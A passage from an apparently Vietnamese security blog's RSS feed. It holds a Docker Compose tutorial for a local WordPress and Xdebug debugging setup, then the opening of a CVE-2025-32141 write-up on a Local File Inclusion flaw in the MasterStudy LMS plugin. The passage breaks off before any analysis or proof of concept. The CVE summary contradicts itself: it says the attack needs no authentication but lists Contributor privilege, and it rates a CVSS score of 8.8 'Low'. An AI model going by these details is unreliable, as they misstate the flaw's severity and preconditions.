nh·∫≠p nhi·ªÅu l·ªánh v√† c·∫•u h√¨nh ph·ª©c t·∫°p.&lt;br&gt;&#xA;V·ªõi Docker Compose, t·∫•t c·∫£ n·∫±m trong m·ªôt file YAML gi√∫p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;D·ªÖ c√†i ƒë·∫∑t&lt;/strong&gt;: &lt;code&gt;docker-compose up -d&lt;/code&gt; l√† c√≥ ƒë·ªß WordPress + MySQL.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;D·ªÖ chia s·∫ª&lt;/strong&gt;: Ng∆∞·ªùi kh√°c ch·ªâ c·∫ßn c√πng file &lt;code&gt;docker-compose.yml&lt;/code&gt; l√† ch·∫°y ƒë∆∞·ª£c.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;D·ªÖ m·ªü r·ªông&lt;/strong&gt;: Th√™m phpMyAdmin, Nginx, ho·∫∑c Xdebug ch·ªâ c·∫ßn v√†i d√≤ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Xem h∆∞·ªõng d·∫´n c√†i Docker Compose t·∫°i: &lt;a href=&#34;https://docs.docker.com/compose/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.docker.com/compose/install/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;installing-wordpress-with-docker-compose-and-xdebug&#34;&gt;&lt;span&gt;Installing WordPress with Docker Compose and Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#installing-wordpress-with-docker-compose-and-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ph·∫ßn n√†y h∆∞·ªõng d·∫´n c√†i &lt;strong&gt;WordPress v·ªõi Docker Compose&lt;/strong&gt;, t√≠ch h·ª£p &lt;strong&gt;Xdebug&lt;/strong&gt; ƒë·ªÉ debug tr·ª±c ti·∫øp trong &lt;strong&gt;VS Code&lt;/strong&gt;.&lt;br&gt;&#xA;C√°ch n√†y gi√∫p b·∫°n c√≥ m√¥i tr∆∞·ªùng ph√°t tri·ªÉn ƒë·∫ßy ƒë·ªß, d·ªÖ g·ª° l·ªói v√† m·ªü r·ªông.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C·∫•u tr√∫c th∆∞ m·ª•c:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.&#xA;‚îú‚îÄ‚îÄ wordpress&#xA;‚îú‚îÄ‚îÄ docker-compose.yml&#xA;‚îú‚îÄ‚îÄ Dockerfile&#xA;‚îú‚îÄ‚îÄ php.ini&#xA;‚îî‚îÄ‚îÄ .vscode&#xA;    ‚îî‚îÄ‚îÄ launch.json&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-environment&#34;&gt;&lt;span&gt;Setup Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o th∆∞ m·ª•c m·ªõi ƒë·ªÉ ch·ª©a to√†n b·ªô c·∫•u h√¨nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir wordpress-docker &amp;amp;&amp;amp; cd wordpress-docker&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-dockerfile&#34;&gt;&lt;span&gt;Create Dockerfile&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-dockerfile&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Image WordPress m·∫∑c ƒë·ªãnh &lt;strong&gt;ch∆∞a c√≥ Xdebug&lt;/strong&gt;, n√™n ta m·ªü r·ªông b·∫±ng &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano Dockerfile&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;N·ªôi dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;FROM wordpress:latest&#xA;&#xA;# C√†i ƒë·∫∑t Xdebug&#xA;RUN pecl install xdebug &amp;amp;&amp;amp; docker-php-ext-enable xdebug&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-docker-composeyml&#34;&gt;&lt;span&gt;Create docker-compose.yml&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-docker-composeyml&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o file ƒë·ªÉ c·∫•u h√¨nh to√†n b·ªô h·ªá th·ªëng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano docker-compose.yml&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;N·ªôi dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;services:&#xA;  db:&#xA;    image: mysql:latest&#xA;    container_name: wp_db&#xA;    restart: always&#xA;    environment:&#xA;      MYSQL_ROOT_PASSWORD: root&#xA;      MYSQL_DATABASE: wordpress&#xA;      MYSQL_USER: wordpress&#xA;      MYSQL_PASSWORD: wordpress&#xA;    volumes:&#xA;      - db_data:/var/lib/mysql&#xA;&#xA;  wordpress:&#xA;    build: .&#xA;    container_name: wp_app&#xA;    depends_on:&#xA;      - db&#xA;    ports:&#xA;      - &amp;#34;80:80&amp;#34;&#xA;    restart: always&#xA;    environment:&#xA;      WORDPRESS_DB_HOST: db:3306&#xA;      WORDPRESS_DB_USER: wordpress&#xA;      WORDPRESS_DB_PASSWORD: wordpress&#xA;      WORDPRESS_DB_NAME: wordpress&#xA;    volumes:&#xA;      - ./wordpress:/var/www/html&#xA;      - ./php.ini:/usr/local/etc/php/conf.d/php.ini&#xA;&#xA;volumes:&#xA;  db_data:&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;volumes:&lt;/code&gt; d√πng ƒë·ªÉ &lt;strong&gt;l∆∞u tr·ªØ d·ªØ li·ªáu v√† ƒë·ªìng b·ªô m√£ ngu·ªìn&lt;/strong&gt; gi·ªØa m√°y th·∫≠t v√† container.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Gi·∫£i th√≠ch:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;db_data:/var/lib/mysql&lt;/code&gt;&lt;/strong&gt;&#xA;L∆∞u d·ªØ li·ªáu MySQL b·ªÅn v·ªØng, kh√¥ng m·∫•t khi x√≥a container.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./wordpress:/var/www/html&lt;/code&gt;&lt;/strong&gt;&#xA;ƒê·ªìng b·ªô m√£ ngu·ªìn WordPress gi·ªØa m√°y v√† container, gi√∫p s·ª≠a code tr·ª±c ti·∫øp.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./php.ini:/usr/local/etc/php/conf.d/php.ini&lt;/code&gt;&lt;/strong&gt;&#xA;G·∫Øn file c·∫•u h√¨nh PHP/Xdebug, d·ªÖ t√πy ch·ªânh m√† kh√¥ng c·∫ßn rebuild image.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-phpini&#34;&gt;&lt;span&gt;Create php.ini&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-phpini&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;K√≠ch ho·∫°t Xdebug v√† c·∫•u h√¨nh PHP.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;N·ªôi dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=172.17.0.1&#xA;xdebug.client_port=9003&#xA;xdebug.log_level=0&#xA;&#xA;upload_max_filesize = 64M&#xA;post_max_size = 64M&#xA;memory_limit = 128M&#xA;max_execution_time = 300&#xA;max_input_time = 300&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Gi·∫£i th√≠ch:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;C√°c d√≤ng &lt;code&gt;xdebug.*&lt;/code&gt; gi√∫p k·∫øt n·ªëi v·ªõi VS Code khi debug.&lt;/li&gt;&#xA;&lt;li&gt;C√°c d√≤ng sau tƒÉng gi·ªõi h·∫°n upload v√† t√†i nguy√™n PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-vs-code-launch-configuration&#34;&gt;&lt;span&gt;Create VS Code Launch Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-vs-code-launch-configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o file c·∫•u h√¨nh VS Code ƒë·ªÉ k·∫øt n·ªëi v·ªõi Xdebug:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir .vscode &amp;amp;&amp;amp; nano .vscode/launch.json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;N·ªôi dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/var/www/html&amp;#34;: &amp;#34;${workspaceFolder}/wordpress&amp;#34;&#xA;      },&#xA;      &amp;#34;log&amp;#34;: true&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-vs-code-extension&#34;&gt;&lt;span&gt;Install VS Code Extension&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-vs-code-extension&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;M·ªü VS Code ‚Üí &lt;strong&gt;Extensions (Ctrl + Shift + X)&lt;/strong&gt; ‚Üí C√†i ƒë·∫∑t:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP Debug (by Xdebug)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;run-docker-compose&#34;&gt;&lt;span&gt;Run Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#run-docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Kh·ªüi ƒë·ªông h·ªá th·ªëng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi kh·ªüi ch·∫°y, truy c·∫≠p &lt;strong&gt;&lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt;&lt;/strong&gt; ƒë·ªÉ c√†i ƒë·∫∑t WordPress.&#xA;Gi·ªù b·∫°n c√≥ th·ªÉ ƒë·∫∑t breakpoint trong file PHP v√† debug tr·ª±c ti·∫øp tr√™n VS Code.&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32141 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-21-cve-2025-32141/</link>
      <pubDate>Tue, 21 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-21-cve-2025-32141/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;MasterStudy LMS&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 3.5.28&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32141&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32141&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.28&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/masterstudy-lms-learning-management-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MasterStudy LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;MasterStudy LMS&lt;/strong&gt;: &lt;strong&gt;3.5.28&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;3.5.29&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 